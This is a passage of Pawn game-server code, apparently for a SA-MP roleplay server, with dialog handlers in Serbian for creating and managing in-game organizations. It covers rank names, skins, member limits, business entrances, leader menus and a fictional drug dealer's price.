			ShowPlayerDialog( playerid, dialog_ORGRANK2, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 2 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if( OrgKreiranje[ playerid ] == 0 )
			{
				strmid( org_info[ id ][ oRank2 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_2", org_info[ id ][ oRank2 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank2 ] );
			}
			else
			{
				strmid( org_info[ id ][ oRank2 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank2 ] );
				ShowPlayerDialog( playerid, dialog_ORGRANK3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 3 ove organizacije.", "Potvrdi", "Odustani");
			}
		}
	}
	else if(dialogid == dialog_ORGRANK3)
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[31]", ime)) return ShowPlayerDialog( playerid, dialog_ORGRANK3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 3 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen( inputtext ) < 4 || strlen(inputtext) > 30) 
		{
			ShowPlayerDialog( playerid, dialog_ORGRANK3, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 3 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if(OrgKreiranje[ playerid ] == 0 )
			{
	            strmid(org_info[ id ][ oRank3 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_3", org_info[ id ][ oRank3 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank3 ] );
			}
			else
			{
				strmid(org_info[ id ][ oRank3 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank3 ] );
				ShowPlayerDialog( playerid, dialog_ORGRANK4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 4 ove organizacije.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGRANK4)
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[31]", ime)) return ShowPlayerDialog( playerid, dialog_ORGRANK4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 4 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen( inputtext ) < 4 || strlen(inputtext) > 30) 
		{
			ShowPlayerDialog( playerid, dialog_ORGRANK4, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 4 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if( OrgKreiranje[ playerid ] == 0 )
			{
	            strmid( org_info[ id][ oRank4 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_4", org_info[ id ][ oRank4 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank4 ] );
			}
			else
			{
				strmid( org_info[ id][ oRank4 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank4 ] );
				ShowPlayerDialog( playerid, dialog_ORGRANK5, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 5 ove organizacije.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGRANK5)
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[31]", ime)) return ShowPlayerDialog( playerid, dialog_ORGRANK5, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 5 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen( inputtext ) < 4 || strlen(inputtext) > 30) 
		{
			ShowPlayerDialog( playerid, dialog_ORGRANK5, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 5 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if( OrgKreiranje[ playerid ] == 0 )
			{
	        	strmid( org_info[ id ][ oRank5 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_5", org_info[ id ][ oRank5 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank5 ] );
			}
			else
			{
				strmid( org_info[ id ][ oRank5 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank5 ] );
				ShowPlayerDialog( playerid, dialog_ORGRANK6, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 6(lidera) ove organizacije.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGRANK6)
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if( sscanf( inputtext, "s[31]", ime ) ) return ShowPlayerDialog( playerid, dialog_ORGRANK6, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 6 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen( inputtext ) < 4 || strlen(inputtext) > 30) 
		{
			ShowPlayerDialog( playerid, dialog_ORGRANK6, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 6 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if( OrgKreiranje[ playerid ] == 0 )
			{
	        	strmid( org_info[ id ][ oRank6 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_6", org_info[ id ][ oRank6 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank6 ] );
			}
			else
			{
				strmid( org_info[ id ][ oRank6 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank6 ] );
				ShowPlayerDialog( playerid, dialog_ORGSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove muskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGSKINS && response )
	{
	    new id = GetNearestOrganization(playerid), rank1, rank2, rank3, rank4, rank5, rank6;
	    if(sscanf(inputtext, "iiiiii", rank1, rank2, rank3, rank4, rank5, rank6)) return ShowPlayerDialog( playerid, dialog_ORGSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove muskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
        if( OrgKreiranje[ playerid ] == 0 )
		{
            org_info[ id ][ oSkin1 ] = rank1;
		    org_info[ id ][ oSkin2 ] = rank2;
		    org_info[ id ][ oSkin3 ] = rank3;
		    org_info[ id ][ oSkin4 ] = rank4;
		    org_info[ id ][ oSkin5 ] = rank5;
		    org_info[ id ][ oSkin6 ] = rank6;

		    new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `male_skin_1` = '%d', `male_skin_2` = '%d', `male_skin_3` = '%d',`male_skin_4` = '%d', `male_skin_5` = '%d', `male_skin_6` = '%d' WHERE `org_id` = '%d' LIMIT 1",
				org_info[ id ][ oSkin1 ],
				org_info[ id ][ oSkin2 ],
				org_info[ id ][ oSkin3 ],
				org_info[ id ][ oSkin4 ],
				org_info[ id ][ oSkin5 ],
				org_info[ id ][ oSkin6 ],
				org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Uspesno ste promenili ID-ove muskih skinova za rankove," );
		}
        else
		{
			org_info[ id ][ oSkin1 ] = rank1;
		    org_info[ id ][ oSkin2 ] = rank2;
		    org_info[ id ][ oSkin3 ] = rank3;
		    org_info[ id ][ oSkin4 ] = rank4;
		    org_info[ id ][ oSkin5 ] = rank5;
		    org_info[ id ][ oSkin6 ] = rank6;

		    SendInfoMessage( playerid, "Uspesno ste postavili ID-ove muskih skinova za rankove!" );
		    ShowPlayerDialog( playerid, dialog_ORGZSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove zenskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
		}
	}
	else if(dialogid == dialog_ORGZSKINS && response )
	{
	    new id = GetNearestOrganization(playerid);
	    new rank1, rank2, rank3, rank4, rank5, rank6;
	    if(sscanf(inputtext, "iiiiii", rank1, rank2, rank3, rank4, rank5, rank6)) return ShowPlayerDialog( playerid, dialog_ORGZSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove zenskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
        if( OrgKreiranje[ playerid ] == 0 )
		{
            org_info[ id ][ oZSkin1 ] = rank1;
		    org_info[ id ][ oZSkin2 ] = rank2;
		    org_info[ id ][ oZSkin3 ] = rank3;
		    org_info[ id ][ oZSkin4 ] = rank4;
		    org_info[ id ][ oZSkin5 ] = rank5;
		    org_info[ id ][ oZSkin6 ] = rank6;

		    new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `female_skin_1` = '%d', `female_skin_2` = '%d', `female_skin_3` = '%d',`female_skin_4` = '%d', `female_skin_5` = '%d', `female_skin_6` = '%d' WHERE `org_id` = '%d' LIMIT 1",
				org_info[ id ][ oZSkin1 ],
				org_info[ id ][ oZSkin2 ],
				org_info[ id ][ oZSkin3 ],
				org_info[ id ][ oZSkin4 ],
				org_info[ id ][ oZSkin5 ],
				org_info[ id ][ oZSkin6 ],
				org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Uspesno ste promenili ID-ove zenskih skinova za rankove." );
		}
        else
		{
			org_info[ id ][ oZSkin1 ] = rank1;
		    org_info[ id ][ oZSkin2 ] = rank2;
		    org_info[ id ][ oZSkin3 ] = rank3;
		    org_info[ id ][ oZSkin4 ] = rank4;
		    org_info[ id ][ oZSkin5 ] = rank5;
		    org_info[ id ][ oZSkin6 ] = rank6;
		    ShowPlayerDialog( playerid, dialog_ORGMAXMEMB, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koliko ova orga moze imati maksimalno clanova(8 > 50):", "Potvrdi", "Odustani" );

		    SendInfoMessage( playerid, "Uspesno ste postavili ID-ove zenskih skinova za rankove." );
		}
	}
	else if(dialogid == dialog_ORGMAXMEMB && response )
	{
	    new id = GetNearestOrganization( playerid ), maxmemb;
	    if( sscanf( inputtext, "i", maxmemb ) ) return ShowPlayerDialog( playerid, dialog_ORGMAXMEMB, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koliko ova orga moze imati maksimalno clanova(8 > 50):", "Potvrdi", "Odustani" );
		if( maxmemb < 8 || maxmemb > 50 ) return ShowPlayerDialog( playerid, dialog_ORGMAXMEMB, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koliko ova orga moze imati maksimalno clanova(8 > 50):", "Potvrdi", "Odustani" );
        if( OrgKreiranje[ playerid ] == 0 )
		{
            SendInfoMessage( playerid, "Uspesno ste postavili broj maksimalno clanova na {FFFFFF}(%d).", maxmemb );
            org_info[ id ][ oMaxClanova ] = maxmemb;
            sql_organization_update_integer( id, "max_members", org_info[ id ][ oMaxClanova ] );
        }
        else
		{
			org_info[ id ][ oMaxClanova ] = maxmemb;

	        SendInfoMessage( playerid, "Uspesno ste postavili broj maksimalno clanova na {FFFFFF}(%d).", maxmemb );

	        ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Ako je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
        }
	}
	else if(dialogid == dialog_ORGBENTRANCE && response )
	{
	    new id = GetNearestOrganization( playerid ), idfirme;
	    if( sscanf( inputtext, "i", idfirme ) ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Ako je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
		if( idfirme < -1 ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}ERROR: {FFFFFF}Broj ne moze ispod 1.\n\nAko je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
		if( OrgKreiranje[ playerid ] == 0 )
		{
            if( idfirme != -1 )
			{
                if( BusinessInfo[ idfirme ][ b_ID ] == 0 ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}ERROR: {FFFFFF}Ta firma ne postoji u bazi podataka.\n\nAko je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
                if( BusinessInfo[ idfirme ][ bOwner_sqlID ] != -1 ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}ERROR: {FFFFFF}Ova firma ima vlasnika ne mozes nju.\n\nAko je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );

                org_info[ id ][ oEntFromBussines ] = idfirme;
                org_info[ id ][ oBussinesID ] = idfirme;

				org_info[ id ][ oEntInt ] = BusinessInfo[ idfirme ][ bInInt ];
			    org_info[ id ][ oEntVw ] = BusinessInfo[ idfirme ][ bInVW ];
			    Orge3D( id );

			    BusinessInfo[ idfirme ][ bOwnerOrg ] = id;
				Bussines_Refresh( idfirme );

			    SendInfoMessage( playerid, "Uspesno ste postavili ulaz iz firme {FFFFFF}(%d).", idfirme );
			    sql_organization_update_integer( id, "ent_bussines", BusinessInfo[ org_info[ id ][ oEntFromBussines ] ][ b_ID ] );
			}
        }
        else
		{
            org_info[ id ][ oEntFromBussines ] = idfirme;
            org_info[ id ][ oBussinesID ] = idfirme;

            if( idfirme != -1 ) 
            {
                if( BusinessInfo[ idfirme ][ b_ID ] == 0 ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}ERROR: {FFFFFF}Ta firma ne postoji u bazi podataka.\n\nAko je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
                if( BusinessInfo[ idfirme ][ bOwner_sqlID ] != -1 ) return ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}ERROR: {FFFFFF}Ova firma ima vlasnika ne mozes nju.\n\nAko je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );

				org_info[ id ][ oEntInt ] = BusinessInfo[ idfirme ][ bInInt ];
			    org_info[ id ][ oEntVw ] = BusinessInfo[ idfirme ][ bInVW ];
			    Orge3D( id );

			    BusinessInfo[ idfirme ][ bOwnerOrg ] = id;
				Bussines_Refresh( idfirme );
			}

	        sql_create_organization( id );

	        SendInfoMessage( playerid, "Uspesno ste postavili ulaz iz firme ID {FFFFFF}(%d).", idfirme );
	        SendInfoMessage( playerid, "Uspesno ste zavrsili kreiranje organizacije." );
	        OrgKreiranje[ playerid ] = 0;
        }
	}
	else if(dialogid == dialog_ORG && response )
	{
		switch( listitem )
		{
		    case 0:
			{
		        new OrgID = PlayerInfo[ playerid ][ xClan ];

                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

                new string[ 128 ];
	         	format( string, sizeof( string ), "{4282C0}Broj ubacenih clanova: {FFFFFF}(%d/%d)\n", org_info[ OrgID ][ oUbacenihClanova ], org_info[ OrgID ][ oMaxClanova ] );
                strcat( DialogStrgEx, string );

                strcat( DialogStrgEx, "Ukoliko igrac bude kikovan, a nije bio 10 sati u orgi dobija 10 sati org kaznu.\nIsto ce se to desiti i ukoliko sam napusti, a nije bio 10 sati.\n" );

                if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
				{
                    strcat( DialogStrgEx, "Za svako ubistvo igraca sa WL dobijate 2500$ po WLu.\n" );
                    strcat( DialogStrgEx, "Ukoliko uhapsite igraca dobijate 5000$ po WLu.\n" );
                }
                else if( GetFactionType( playerid ) == ORG_TIP_BANDA || GetFactionType( playerid ) == ORG_TIP_MAFIJA )
				{
                    strcat( DialogStrgEx, "Za svaku teritoriju vasa orga dobija po 25000$ dolara svakog punog sata.\n" );
                    strcat( DialogStrgEx, "1, 6, 11, 16, 21, 26, 29 ovih 7 dana u mesecu stize paket u 20h sa MNOGO matsa i droge.\n" );
                }

				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		    }
		    case 1:
			{
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				new OrgID = PlayerInfo[ playerid ][ xLider ], l_or_m[ 10 ], l_c = 0, m_c = 0;

				for( new i = 0; i < org_info[ OrgID ][ oMaxClanova ]+2; i++ )
				{
                	if( org_members_info[ OrgID ][ i ][ o_m_type ] == 1 )
					{
						l_or_m = "Lider"; l_c++;
						format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, l_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
					}
            		else
					{
						l_or_m = "Clan"; m_c++;
						format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, m_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
					}
				}

				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            }
		}
	}
	else if(dialogid == dialog_LIDER && response )
	{
		switch( listitem )
		{
		    case 0:
			{
		        new OrgID = PlayerInfo[ playerid ][ xLider ];

                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

                new string[ 128 ];
	         	format( string, sizeof( string ), "{4282C0}Broj ubacenih clanova: {FFFFFF}(%d/%d)\n", org_info[ OrgID ][ oUbacenihClanova ], org_info[ OrgID ][ oMaxClanova ] );
                strcat( DialogStrgEx, string );

                strcat( DialogStrgEx, "Ukoliko kikujete igraca, a nije bio 10 sati u orgi dobija 10 sati org kaznu.\nIsto ce se to desiti i ukoliko sam napusti a nije bio 10 sati.\n" );

                if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
				{
                    strcat( DialogStrgEx, "Za svako ubistvo igraca sa WL dobijate $2500 po WLu.\n" );
                    strcat( DialogStrgEx, "Ukoliko uhapsite igraca dobijate $5000 po wanted levelu.\n" );
                }
                else if( GetFactionType( playerid ) == ORG_TIP_BANDA || GetFactionType( playerid ) == ORG_TIP_MAFIJA )
				{
                    strcat( DialogStrgEx, "Za svaku obicnu teritoriju vasa orga dobija po 2000$ dolara svakog punog sata, a za specijalnu 10000$.\n" );
                    strcat( DialogStrgEx, "Svakog sata stize po 2 paketa sa drogom i materijalom na random poziciji.\n" );
                }

				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		    }
	 		case 1:
			{
	 			ShowPlayerDialog( playerid, dialog_UBACIUORG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca kojeg zelite pozvati u vasu organizaciju:", "Potvrdi", "Odustani");
		 	}
	 		case 2:
		 	{
	 			ShowPlayerDialog( playerid, dialog_IZBACIIZORG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca kojeg zelite izbaciti iz vase organizacije:", "Potvrdi", "Odustani");
		 	}
			case 3:
			{
	 			ShowPlayerDialog( playerid, dialog_OFFIZBACIIZORG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite (Ime_Prezime) igraca kojeg zelite izbaciti iz vase organizacije:", "Potvrdi", "Odustani");
		 	}
			case 4:
			{
	 			ShowPlayerDialog( playerid, dialog_DODELIRANK, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca i broj ranka koji zelite da date igracu:", "Potvrdi", "Odustani");
		 	}
            case 5:
			{
	 			ShowPlayerDialog( playerid, dialog_KAZNIIGRACA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca kojeg zelite kazniti iz vase organizacije:", "Potvrdi", "Odustani");
		 	}
			case 6:
			{
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				new OrgID = PlayerInfo[ playerid ][ xLider ], l_or_m[ 10 ], l_c = 0, m_c = 0;

				for( new i = 0; i < org_info[ OrgID ][ oMaxClanova ]+2; i++ )
				{
                	if( org_members_info[ OrgID ][ i ][ o_m_type ] == 1 )
					{
						l_or_m = "Lider"; l_c++;
						format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, l_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
					}
            		else
					{
						l_or_m = "Clan"; m_c++;
						format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, m_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
					}
				}

				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            }
			case 7:
			{
			    if( GetFactionType( playerid ) == ORG_TIP_VLADINA && GetFactionType( playerid ) == ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju." );

 				ShowPlayerDialog( playerid, dialog_WAR, DIALOG_STYLE_LIST, D_NASLOV, "Zakazi War\nPozovi u War\nIzbaci iz Wara", "Potvrdi", "Odustani" );
			}
			case 8:
			{
			    ShowPlayerDialog(playerid, dialog_DILER, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Prodajna cena\n{4282C0}(1). {FFFFFF}Obustavi/pokreni prodaju", "Potvrdi", "Odustani");
			}
			case 9:
			{
			    for(new i, z = GetVehiclePoolSize(); i <= z; i++)
			    {
			    	if(VehicleInfo[i][vOrganization] == PlayerInfo[playerid][xLider] && IsVehicleEmpty(i)) SetVehicleToRespawn(i);
			    }
			    DodajWarnRed("~p~(ORG-RAC) %s(%d) ~w~je respawnova%s vozila svoje organizacije.", ImeIgraca(playerid), playerid, getPolForString(playerid, "o", "la"));
			    OrgPoruka(PlayerInfo[playerid][xLider], 0xFF0000FF, "#RAC: {FFFFFF}Lider {FF0000}%s {FFFFFF}je respawnova%s vozila organizacije.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));
			}
			case 10:
			{
			    ShowPlayerDialog( playerid, dialog_ORGFIRMA, DIALOG_STYLE_LIST, D_NASLOV, "Informacije\nPromeni ime\nZakljucaj/Otkljucaj Firmu\nPodigni novac\nOstavi novac", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGFIRMA && response )
	{
	    switch( listitem )
		{
		    case 0:
			{
				new id = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ];

				format( globalstring, sizeof( globalstring ), "{FF0000}Ime Firme: {FFFFFF}%s\n\n{FF0000}Novac: {FFFFFF}%d", BusinessInfo[ id ][ bName ], BusinessInfo[ id ][ bMoney ] );
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, globalstring, "Potvrdi", "Odustani" );
			}
	        case 1:
			{
				ShowPlayerDialog( playerid, dialog_OFCNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete novo ime koje zelite.", "Potvrdi", "Odustani" );
			}
			case 2:
			{
	            ShowPlayerDialog( playerid, dialog_OFLOCK, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Molimo vas da odaberete da li zelite da...", "Otkljucate", "Zakljucate" );
			}
			case 3:
			{
			    if( GetNearestBussines( playerid ) != org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
	  			ShowPlayerDialog( playerid, dialog_OFPMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete koliko zelite novca da podignete..", "Potvrdi", "Odustani" );
	  		}
			case 4:
			{
	  			if( GetNearestBussines( playerid ) != org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
				ShowPlayerDialog( playerid, dialog_OFOMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete koliko zelite novca da ostavite...", "Potvrdi", "Odustani" );
			}
			case 5:
			{
			    if( GetNearestBussines( playerid ) != org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
				if( org_info[ PlayerInfo[ playerid ][ xLider ] ][ oEntFromBussines ] != -1 ) return SendErrorMessage( playerid, "Ne mozes prodati firmu u kojoj ti je ulaz u HQ." );

	            ShowPlayerDialog( playerid, dialog_ORGBIZZSELL, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Da li ste sigurni da zelite prodati vasu firmu drzavi?", "Da", "Ne" );
			}
		}
	}
	else if(dialogid == dialog_DILER && response )
	{
		switch(listitem)
		{
		    case 0: ShowPlayerDialog( playerid, dialog_DILERCENA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite cenu droge za dilera:", "Da", "Ne" );
		    case 1:
		    {
		        if(org_info[ PlayerInfo[ playerid ][ xLider ] ][ oDilerRadi ])
		        {
		            new bb = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oID ];
		            org_info[ bb ][ oDilerRadi ] = false;
		            SendInfoMessage(playerid, "Obustavili ste prodaju dilera.");
					sql_organization_update_integer( bb, "oDilerRadi", org_info[ bb ][ oDilerRadi ] );

					new q[200];
					format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", bb, org_info[ bb ][ oDilerCena ], org_info[ bb ][ oSafeDrugAmmount ], ((org_info[bb][oDilerRadi]) ? ("Da") : ("Ne")) );
					UpdateDynamic3DTextLabelText(org_info[bb][oDiler3D], 0x64BC47FF, q);
		        }
		        else
		        {
		            new bb = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oID ];
		            org_info[ bb ][ oDilerRadi ] = true;
		            SendInfoMessage(playerid, "Nastavili ste prodaju dilera.");
					sql_organization_update_integer( bb, "oDilerRadi", org_info[ bb ][ oDilerRadi ] );

					new q[200];
					format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", bb, org_info[ bb ][ oDilerCena ], org_info[ bb ][ oSafeDrugAmmount ], ((org_info[bb][oDilerRadi]) ? ("Da") : ("Ne")) );
					UpdateDynamic3DTextLabelText(org_info[bb][oDiler3D], 0x64BC47FF, q);
		        }
		    }
		}
	}
	else if(dialogid == dialog_DILERCENA && response )
	{
	    new iznos, ID = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oID ];
		if( sscanf(inputtext, "i", iznos)) return ShowPlayerDialog( playerid, dialog_DILERCENA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite cenu droge za dilera:", "Da", "Ne" );
		if( iznos < 100 || iznos > 2000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 100 i iznad 2000!");

		org_info[ ID ][ oDilerCena ] = iznos;
		sql_organization_update_integer( ID, "oDilerCena", org_info[ ID ][ oDilerCena ] );
  		SendInfoMessage(playerid, "Postavili ste prodaju cenu na %d.", iznos);

		new q[200];
